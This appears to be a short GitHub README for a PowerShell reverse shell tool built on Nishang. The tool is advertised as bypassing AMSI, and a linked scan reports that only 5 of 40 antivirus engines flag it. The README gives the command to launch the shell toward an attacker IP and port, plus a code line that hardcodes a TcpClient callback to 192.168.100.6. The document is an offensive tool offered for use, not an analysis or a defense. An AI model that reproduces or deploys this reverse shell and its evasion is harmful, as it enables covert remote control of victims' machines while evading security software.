# RevershellTCP_BypassAMSI

This script is based on Nishang's, thanks for sharing<br>


```sh
. .\ .\rshell.ps1 192.168.100.6 443
```
![image](https://user-images.githubusercontent.com/66162160/163723667-0e4ff036-e469-4d8e-b6ac-919344bb7e0b.png)


## If you want to modify the connection automatically with no arguments just modify line 1 as follows.

$servidor = new-object System.Net.Sockets.TcpClient('192.168.100.6',80);  <br>

## Bypass 05/40 AV 

https://kleenscan.com/scan_result/4789bcc1351d6c4ded38b058fc8696bac69204dc4866f404310b14d0d2fcbd04

![image](https://user-images.githubusercontent.com/66162160/163724011-54d3413f-6b90-43fd-9632-6e77764b1cb2.png)
